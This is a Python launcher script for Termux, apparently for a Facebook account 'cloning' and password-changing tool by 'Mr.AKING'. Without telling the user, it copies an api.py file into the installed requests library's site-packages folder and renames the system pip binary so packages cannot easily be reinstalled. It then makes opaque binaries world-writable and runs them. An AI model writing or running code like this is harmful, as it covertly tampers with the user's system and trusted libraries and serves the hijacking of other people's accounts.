import os
try:import httpx,requests
except ModuleNotFoundError:os.system('pip install httpx requests')
os.system('cp api.py /data/data/com.termux/files/usr/lib/python3.11/site-packages/requests')
try:
    x=open('.x.txt','r').read()
    if 'Opend' in x:
        os.system('mv /data/data/com.termux/files/usr/bin/pip /data/data/com.termux/files/usr/bin/pip1')
    else:
       pass
except FileNotFoundError:
 pass
logo = """  \033[1;32m[Create By AKING]\033[1;37m
 ╔═╗┌┐   ╔╦╗┌─┐┌─┐┬  ┌─┐
 ╠╣ ├┴┐───║ │ ││ ││  └─┐
 ╚  └─┘   ╩ └─┘└─┘┴─┘└─┘
------------------×------------------
 Tool by: Mr.AKING
 Special For Tong
------------------×------------------"""
def linex():
    print('\033[1;37m------------------×------------------')
os.system('clear')
print(logo)
print(' [1] file cloning \n [2] create file \n [3] change password + apply 2f\n [0] exit menu ')
linex()
aking=input(' choice an option: ')
if aking =='1':
 open('.x.txt','a').write('Opend')
 os.system('chmod 777 d64;./d64')
elif aking =='2':
 import FILE64
elif aking =='3':
 os.system('chmod 777 fa64;./fa64')
elif aking =='0':
 exit(' Thanks For Use Our Service ')
else:
 exit(' You Select involved Option!')
